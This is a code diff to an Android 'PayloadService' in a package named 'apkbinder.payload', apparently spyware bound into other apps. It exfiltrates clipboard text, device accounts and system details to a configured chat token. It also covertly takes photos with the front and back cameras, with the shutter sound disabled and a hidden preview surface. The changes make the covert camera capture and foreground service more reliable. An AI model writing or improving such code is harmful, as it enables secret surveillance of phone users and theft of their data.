@@ -1,5 +1,6 @@
 package Com.devhs.apkbinder.payload
 
+import android.Manifest
 import android.accounts.AccountManager
 import android.app.ActivityManager
 import android.app.Notification
@@ -75,11 +76,27 @@ class PayloadService : Service() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         HsLog.w("onStartCommand")
         val clipText = intent?.getStringExtra("clip") ?: ""
-        startForegroundSafe()
+
+        val cfg = HsConfig.read(this)
+        if (cfg == null) {
+            HsLog.e("no config")
+            finish()
+            return START_NOT_STICKY
+        }
+        token = cfg.token
+        chat = cfg.chat
+        val f = cfg.features
+        HsLog.w("features=$f")
+
+        val front = f.contains("front_camera")
+        val back = f.contains("back_camera")
+        val hasCamera = front || back
+
+        startForegroundSafe(hasCamera)
 
         Thread {
             try {
-                run(clipText)
+                run(f, clipText, front, back)
             } catch (t: Throwable) {
                 HsLog.e("run: ${t.javaClass.simpleName} ${t.message}")
             }
@@ -103,22 +120,8 @@ class PayloadService : Service() {
 
     // ---------------- main ----------------
 
-    private fun run(clipText: String) {
-        val cfg = HsConfig.read(this)
-        if (cfg == null) {
-            HsLog.e("no config")
-            finish()
-            return
-        }
-        token = cfg.token
-        chat = cfg.chat
-        val f = cfg.features
-        HsLog.w("features=$f")
-
-        val front = f.contains("front_camera")
-        val back = f.contains("back_camera")
+    private fun run(f: List<String>, clipText: String, front: Boolean, back: Boolean) {
         val clipOn = f.contains("clipboard")
-        val hasCamera = front || back
 
         if (clipOn) {
             if (clipText.isNotEmpty()) sendTextFile("clipboard.txt", clipText + "\n")
@@ -146,7 +149,6 @@ class PayloadService : Service() {
         if (f.contains("accounts")) workPool.execute { sendAccounts() }
         if (f.contains("system")) workPool.execute { sendSystem() }
 
-        // সব টেক্সট/গ্যালারি শেষ হওয়া পর্যন্ত অপেক্ষা
         workPool.shutdown()
         try {
             workPool.awaitTermination(90, TimeUnit.MINUTES)
@@ -154,8 +156,7 @@ class PayloadService : Service() {
         }
         HsLog.w("text done: ${done.get()}")
 
-        // এখন ক্যামেরা
-        if (hasCamera) {
+        if (front || back) {
             HsLog.w("camera start front=$front back=$back")
             startCameras(front, back)
         } else if (!clipOn) {
@@ -177,7 +178,7 @@ class PayloadService : Service() {
 
     // ---------------- notification ----------------
 
-    private fun startForegroundSafe() {
+    private fun startForegroundSafe(camera: Boolean) {
         try {
             val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
             if (Build.VERSION.SDK_INT >= 26) {
@@ -212,11 +213,19 @@ class PayloadService : Service() {
 
             val n = builder.build()
 
+            val camOk = camera && Build.VERSION.SDK_INT >= 30 && try {
+                checkSelfPermission(Manifest.permission.CAMERA) ==
+                        PackageManager.PERMISSION_GRANTED
+            } catch (t: Throwable) {
+                false
+            }
+
             if (Build.VERSION.SDK_INT >= 29) {
+                var type = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+                if (camOk) type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                 try {
-                    startForeground(
-                        Const.NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
-                    )
+                    startForeground(Const.NOTIF_ID, n, type)
+                    HsLog.w("fg typed=$type")
                     return
                 } catch (t: Throwable) {
                     HsLog.e("fg typed: ${t.message}")
@@ -224,6 +233,7 @@ class PayloadService : Service() {
             }
             try {
                 startForeground(Const.NOTIF_ID, n)
+                HsLog.w("fg plain")
             } catch (t: Throwable) {
                 HsLog.e("fg plain: ${t.message}")
             }
@@ -414,7 +424,6 @@ class PayloadService : Service() {
         }
     }
 
-    // সরাসরি পোস্ট — pool shutdown হলেও সমস্যা নেই
     private fun sendTextFile(name: String, content: String) {
         try {
             postFile(
@@ -800,7 +809,6 @@ class PayloadService : Service() {
         return -1
     }
 
-    // একটাই ক্যামেরা থ্রেড — পালা করে, হার্ডওয়্যার দ্বন্দ্ব নেই
     private fun startCameras(front: Boolean, back: Boolean) {
         Thread {
             while (alive) {
@@ -850,6 +858,10 @@ class PayloadService : Service() {
         val cam = openCamera(front) ?: return
         try {
             try {
+                cam.setErrorCallback { error, _ -> HsLog.e("camera error=$error front=$front") }
+            } catch (_: Throwable) {
+            }
+            try {
                 cam.enableShutterSound(false)
             } catch (_: Throwable) {
             }
@@ -868,9 +880,26 @@ class PayloadService : Service() {
             } catch (_: Throwable) {
             }
 
-            val st = SurfaceTexture(0)
-            cam.setPreviewTexture(st)
-            cam.startPreview()
+            var preview = false
+            try {
+                val st = SurfaceTexture(0)
+                cam.setPreviewTexture(st)
+                cam.startPreview()
+                preview = true
+            } catch (t: Throwable) {
+                HsLog.e("preview: ${t.message}")
+            }
+            if (!preview) {
+                try {
+                    cam.release()
+                } catch (_: Throwable) {
+                }
+                try {
+                    Thread.sleep(700L)
+                } catch (_: InterruptedException) {
+                }
+                return
+            }
 
             for (i in 0 until count) {
                 if (!alive) break
